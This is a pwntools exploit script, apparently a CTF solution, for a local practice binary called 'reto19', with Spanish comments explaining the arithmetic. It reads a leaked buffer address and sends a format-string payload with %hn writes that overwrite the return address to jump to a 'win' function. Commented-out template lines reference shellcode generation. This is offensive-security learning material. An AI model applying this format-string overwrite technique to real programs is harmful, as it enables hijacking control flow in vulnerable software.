#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /home/luciano/Descargas/reto19
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/home/luciano/Descargas/reto19')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      No RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x8048000)
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No

io = start()

output = io.recvuntil(b"Pista: buffer comienza en: ")
address_line = io.recvline().strip()  # Captura la dirección
print(address_line)
# Convierte la dirección en un entero
target_address = int(address_line.decode(), 16) + 76  

# Avanza hasta que pida el input
io.recvuntil(b"Ingrese su input:")

#Estoy sobreescribiendo la direccion de retorno. Debo poner aca la dirección donde esta win. Segun objdump la direccion de win es 80484b4, y como no tiene PIE no deberia variar
# La explicacion de como escribir una dirección esta en https://axcheron.github.io/exploit-101-format-strings/
# Tengo que dividirla en dos y mandar esa cantidad de bytes a la parte alta y a la parte baja de la dirección.
# Parte alta: 0804 = 2052 - 8 = 2044 Es menos 8 porque ya escribimos dos direcciones de 4 bytes cada una
# Parte baja: 84b4 = 33972 - 2052 = 31920. 

payload = p32(target_address + 2)+p32(target_address)+b"%2044x%4$hn%31920x%5$hn\n"   

io.send(payload)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

